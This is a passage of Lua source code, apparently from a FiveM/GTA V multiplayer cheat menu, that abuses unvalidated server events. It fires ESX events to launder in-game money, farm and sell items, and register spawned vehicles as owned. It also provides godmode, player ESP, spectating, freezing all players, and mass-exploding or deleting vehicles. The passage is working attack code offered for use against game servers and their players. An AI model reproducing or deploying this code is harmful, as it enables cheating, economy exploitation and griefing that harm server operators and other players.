    jebacariesa('esx_blanchisseur:washMoney', 100)
    jebacariesa('esx_blackmoney:washMoney')
    jebacariesa('esx_moneywash:withdraw', 100)
    jebacariesa('laundry:washcash')
end

function harvestbitcoin()
    jebacariesa('esx_bitcoin:startHarvestKoda')
    jebacariesa('esx_bitcoin:startHarvestKoda')
    jebacariesa('esx_bitcoin:startHarvestKoda')
    jebacariesa('esx_bitcoin:startHarvestKoda')
end

function sellbitcoin()
    jebacariesa('esx_bitcoin:startSellKoda')
    jebacariesa('esx_bitcoin:startSellKoda')
    jebacariesa('esx_bitcoin:startSellKoda')
    jebacariesa('esx_bitcoin:startSellKoda')
end

function harvestgazbottle()
    jebacariesa('esx_mechanicjob:startHarvest')
    jebacariesa('esx_mechanicjob:startHarvest')
    jebacariesa('esx_mechanicjob:startHarvest')
    jebacariesa('esx_mechanicjob:startHarvest')
end

function craftgazbottle()
    jebacariesa('esx_mechanicjob:startCraft')
    jebacariesa('esx_mechanicjob:startCraft')
    jebacariesa('esx_mechanicjob:startCraft')
    jebacariesa('esx_mechanicjob:startCraft')
end

function harvestrepairkits()
    jebacariesa('esx_mechanicjob:startHarvest2')
    jebacariesa('esx_mechanicjob:startHarvest2')
    jebacariesa('esx_mechanicjob:startHarvest2')
    jebacariesa('esx_mechanicjob:startHarvest2')
end

function craftrepairkits()
    jebacariesa('esx_mechanicjob:startCraft2')
    jebacariesa('esx_mechanicjob:startCraft2')
    jebacariesa('esx_mechanicjob:startCraft2')
    jebacariesa('esx_mechanicjob:startCraft2')
end

function harvestbodykits()
    jebacariesa('esx_mechanicjob:startHarvest3')
    jebacariesa('esx_mechanicjob:startHarvest3')
    jebacariesa('esx_mechanicjob:startHarvest3')
    jebacariesa('esx_mechanicjob:startHarvest3')
end

function craftbodykits()
    jebacariesa('esx_mechanicjob:startCraft3')
    jebacariesa('esx_mechanicjob:startCraft3')
    jebacariesa('esx_mechanicjob:startCraft3')
    jebacariesa('esx_mechanicjob:startCraft3')
end

function matanumaispalarufe()
    jebacariesa('esx_drugs:stopHarvestCoke')
    jebacariesa('esx_illegal_drugs:stopHarvestCoke')
    jebacariesa('esx_drugs:stopTransformCoke')
    jebacariesa('esx_illegal_drugs:stopTransformCoke')
    jebacariesa('esx_drugs:stopSellCoke')
    jebacariesa('esx_illegal_drugs:stopSellCoke')
    jebacariesa('esx_drugs:stopHarvestMeth')
    jebacariesa('esx_illegal_drugs:stopHarvestMeth')
    jebacariesa('esx_drugs:stopTransformMeth')
    jebacariesa('esx_illegal_drugs:stopTransformMeth')
    jebacariesa('esx_drugs:stopSellMeth')
    jebacariesa('esx_illegal_drugs:stopSellMeth')
    jebacariesa('esx_drugs:stopHarvestWeed')
    jebacariesa('esx_illegal_drugs:stopHarvestWeed')
    jebacariesa('esx_drugs:stopTransformWeed')
    jebacariesa('esx_illegal_drugs:stopTransformWeed')
    jebacariesa('esx_drugs:stopSellWeed')
    jebacariesa('esx_illegal_drugs:stopSellWeed')
    jebacariesa('esx_drugs:stopHarvestOpium')
    jebacariesa('esx_illegal_drugs:stopHarvestOpium')
    jebacariesa('esx_drugs:stopTransformOpium')
    jebacariesa('esx_illegal_drugs:stopTransformOpium')
    jebacariesa('esx_drugs:stopSellOpium')
    jebacariesa('esx_illegal_drugs:stopSellOpium')
    jebacariesa('esx_bitcoin:stopHarvestKoda')
    jebacariesa('esx_bitcoin:stopSellKoda')
    jebacariesa('esx_mechanicjob:stopHarvest')
    jebacariesa('esx_mechanicjob:stopCraft')
    jebacariesa('esx_mechanicjob:stopHarvest2')
    jebacariesa('esx_mechanicjob:stopCraft2')
    jebacariesa('esx_mechanicjob:stopHarvest3')
    jebacariesa('esx_mechanicjob:stopCraft3')
    jebacariesa('esx_poolcleaner:stopVente')
    av('~w~Everything is now stopped.', false)
end

local function doText(numLetters)
    local totTxt = ""
    for i = 1,numLetters do
        totTxt = totTxt..string.char(math.random(65,90))
    end
    print(totTxt)
end

local function freevehc1()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        pizda(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        if cw then
            SetVehicleNumberPlateText(veh, cw)
            local cx = ESX.Game.GetVehicleProperties(veh)
            jebacariesa('esx_vehicleshop:setVehicleOwned', cx)
            av('~g~~h~Success', false)
        else
            SetVehicleNumberPlateText(veh, doText(3)..' '..math.random(100,999))
            local cx = ESX.Game.GetVehicleProperties(veh)
            jebacariesa('esx_vehicleshop:setVehicleOwned', cx)
            av('~g~~h~Success', false)
        end
    else
        av('~w~~h~Model is not valid !', true)
    end
end

function daojosdinpatpemata()
    local ax = GetPlayerPed(-1)
    local ay = GetVehiclePedIsIn(ax, true)
    if
        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
     then
        SetVehicleOnGroundProperly(ay)
        av('~g~Vehicle Flipped!', false)
    else
        av("~w~You Aren't In The Driverseat Of A Vehicle!", true)
    end
end

function stringsplit(cy, cz)
    if cz == nil then
        cz = '%s'
    end
    local cA = {}
    i = 1
    for cB in string.gmatch(cy, '([^' .. cz .. ']+)') do
        cA[i] = cB
        i = i + 1
    end
    return cA
end
local cC = false

function SpectatePlayer(cD)
    local ax = PlayerPedId(-1)
    cC = not cC
    local cE = GetPlayerPed(cD)
    if cC then
        local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
        RequestCollisionAtCoord(cF, cG, cH)
        NetworkSetInSpectatorMode(true, cE)
        av('Spectating ' .. GetPlayerName(cD), false)
    else
        local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
        RequestCollisionAtCoord(cF, cG, cH)
        NetworkSetInSpectatorMode(false, cE)
        av('Stopped Spectating ' .. GetPlayerName(cD), false)
    end
end

function ShootPlayer(cD)
    local head = GetPedBoneCoords(cD, GetEntityBoneIndexByName(cD, 'SKEL_HEAD'), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        0,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        1,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        2,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        3,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        4,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        5,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        6,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        7,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        8,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        9,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        10,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        11,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        12,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        13,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1,
        false
    )
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        15,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        16,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1,
        false
    )
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        25,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        27,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        28,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        30,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        33,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        34,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        35,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        38,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1,
        true
    )
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
    SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
end

function DelVeh(veh)
    SetEntityAsMissionEntity(Object, 1, 1)
    DeleteEntity(Object)
    SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
    DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
    SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
    SetVehicleDirtLevel(veh, 1.0)
end

function RequestControl(entity)
    local cI = 0
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        cI = cI + 100
        Citizen.Wait(100)
        if cI > 5000 then
            av('Hung for 5 seconds, killing to prevent issues...', true)
        end
    end
end

function getEntity(cD)
    local m, entity = GetEntityPlayerIsFreeAimingAt(cD, Citizen.ReturnResultAnyway())
    return entity
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and 'MouseAndKeyboard' or 'GamePad'
end

function DrawSpecialText(cJ, cK)
    SetTextEntry_2('STRING')
    AddTextComponentString(cJ)
    DrawSubtitleTimed(cK, 1)
end
local cL = true
local cM = false
local cN = true
local cO = true

Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for f = 0, 128 do
                if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(f)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(f), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(f)
                    if cM then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cL then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, f)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, f)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, f)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)
local cP = {
    __gc = function(cQ)
        if cQ.destructor and cQ.handle then
            cQ.destructor(cQ.handle)
        end
        cQ.destructor = nil
        cQ.handle = nil
    end
}

function EnumerateEntities(cR, cS, cT)
    return coroutine.wrap(
        function()
            local cU, f = cR()
            if not f or f == 0 then
                cT(cU)
                return
            end
            local cQ = {
                handle = cU,
                destructor = cT
            }
            setmetatable(cQ, cP)
            local cV = true
            repeat
                coroutine.yield(f)
                cV, f = cS(cU)
            until not cV
            cQ.destructor, cQ.handle = nil, nil
            cT(cU)
        end
    )
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end
function chujkurwaichuj()
local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    
end
function RotationToDirection(cW)
    local cX = cW.z * 0.0174532924
    local cY = cW.x * 0.0174532924
    local cZ = math.abs(math.cos(cY))
    return vector3(-math.sin(cX) * cZ, math.cos(cX) * cZ, math.sin(cY))
end

function OscillateEntity(entity, c_, d0, d1, d2)
    if entity ~= 0 and entity ~= nil then
        local d3 = (d0 - c_) * d1 * d1 - 2.0 * d1 * d2 * GetEntityVelocity(entity)
        ApplyForceToEntity(entity, 3, d3.x, d3.y, d3.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
    end
end
local d4 = true
Citizen.CreateThread(
    function()
        while bw do
            Citizen.Wait(0)
            SetPlayerInvincible(PlayerId(), Godmode)
            SetEntityInvincible(PlayerPedId(-1), Godmode)
            SetEntityVisible(GetPlayerPed(-1), d4, 0)
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId(-1))
            end
            if InfStamina then
                RestorePlayerStamina(PlayerId(-1), 1.0)
            end
            if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
            if VehicleGun then
                local d5 = 'Freight'
                local c0 = GetEntityCoords(GetPlayerPed(-1), true)
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    av('~g~Vehicle Gun Enabled!~n~~w~Use The ~w~AP Pistol~n~~w~Aim ~w~and ~w~Shoot!', false)
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999)
                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_APPISTOL') then
                        if IsPedShooting(GetPlayerPed(-1)) then
                            while not HasModelLoaded(GetHashKey(d5)) do
                                Citizen.Wait(0)
                                pizda(GetHashKey(d5))
                            end
                            local veh =
                                CreateVehicle(
                                GetHashKey(d5),
                                c0.x + 5 * GetEntityForwardX(GetPlayerPed(-1)),
                                c0.y + 5 * GetEntityForwardY(GetPlayerPed(-1)),
                                c0.z + 2.0,
                                GetEntityHeading(GetPlayerPed(-1)),
                                true,
                                true
                            )
                            SetEntityAsNoLongerNeeded(veh)
                            SetVehicleForwardSpeed(veh, 150.0)
                        end
                    end
                end
            end
            if DeleteGun then
                local d6 = getEntity(PlayerId(-1))
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    av('~g~Delete Gun Enabled!~n~~w~Use The ~w~Pistol~n~~w~Aim ~w~and ~w~Shoot ~w~To Delete!')
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
                        if IsPlayerFreeAiming(PlayerId(-1)) then
                            if IsEntityAPed(d6) then
                                if IsPedInAnyVehicle(d6, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(d6, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(d6, true))
                                        SetEntityAsMissionEntity(d6, 1, 1)
                                        DeleteEntity(d6)
                                        av('~g~Deleted!')
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(d6, 1, 1)
                                        DeleteEntity(d6)
                                        av('~g~Deleted!')
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(d6, 1, 1)
                                    DeleteEntity(d6)
                                    av('~g~Deleted!')
                                end
                            end
                        end
                    end
                end
            end
            if fuckallcars then
                for ay in EnumerateVehicles() do
                    if not IsPedAPlayer(GetPedInVehicleSeat(ay, -1)) then
                        SetVehicleHasBeenOwnedByPlayer(ay, false)
                        SetEntityAsMissionEntity(ay, false, false)
                        StartVehicleAlarm(ay)
                        DetachVehicleWindscreen(ay)
                        SmashVehicleWindow(ay, 0)
                        SmashVehicleWindow(ay, 1)
                        SmashVehicleWindow(ay, 2)
                        SmashVehicleWindow(ay, 3)
                        SetVehicleTyreBurst(ay, 0, true, 1000.0)
                        SetVehicleTyreBurst(ay, 1, true, 1000.0)
                        SetVehicleTyreBurst(ay, 2, true, 1000.0)
                        SetVehicleTyreBurst(ay, 3, true, 1000.0)
                        SetVehicleTyreBurst(ay, 4, true, 1000.0)
                        SetVehicleTyreBurst(ay, 5, true, 1000.0)
                        SetVehicleTyreBurst(ay, 4, true, 1000.0)
                        SetVehicleTyreBurst(ay, 7, true, 1000.0)
                        SetVehicleDoorBroken(ay, 0, true)
                        SetVehicleDoorBroken(ay, 1, true)
                        SetVehicleDoorBroken(ay, 2, true)
                        SetVehicleDoorBroken(ay, 3, true)
                        SetVehicleDoorBroken(ay, 4, true)
                        SetVehicleDoorBroken(ay, 5, true)
                        SetVehicleDoorBroken(ay, 6, true)
                        SetVehicleDoorBroken(ay, 7, true)
                        SetVehicleLights(ay, 1)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, ay, 1)
                        SetVehicleNumberPlateTextIndex(ay, 5)
                        SetVehicleNumberPlateText(ay, 'skaza')
                        SetVehicleDirtLevel(ay, 10.0)
                        SetVehicleModColor_1(ay, 1)
                        SetVehicleModColor_2(ay, 1)
                        SetVehicleCustomPrimaryColour(ay, 255, 51, 255)
                        SetVehicleCustomSecondaryColour(ay, 255, 51, 255)
                        SetVehicleBurnout(ay, true)
                    end
                end
            end
            if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleUndriveable(vehicle, true)
                        SetVehicleEngineHealth(vehicle, 0)
                    end
                end
            end
            if explodevehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        NetworkExplodeVehicle(vehicle, true, true, false)
                    end
                end
            end
            if huntspam then
                Citizen.Wait(50)
                jebacariesa('esx-qalle-hunting:reward', 50)
                jebacariesa('esx-qalle-hunting:sell')
            end
            if deletenearestvehicle then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(vehicle, true))
                        SetEntityAsMissionEntity(vehicle, 1, 1)
                        DeleteEntity(vehicle)
                    end
                end
            end
            if freezeplayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end
            if freezeall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end
            if esp then
                for i = 0, 128 do
                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                        local a8 = k(1.0)
                        local d7 = GetPlayerPed(i)
                        local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                        local x, y, z = table.unpack(GetEntityCoords(d7))
                        local db =
                            '~h~Name: ' ..
                            GetPlayerName(i) ..
                                '\nServer ID: ' ..
                                    GetPlayerServerId(i) ..
                                        '\nPlayer ID: ' ..
                                            i ..
                                                '\nDist: ' ..
                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
                        if IsPedInAnyVehicle(d7, true) then
                            local dc =
                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
                            db = db .. '\nVeh: ' .. dc
                        end
                        if espinfo and esp then
                            DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
                        end
                        if espbox and esp then
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
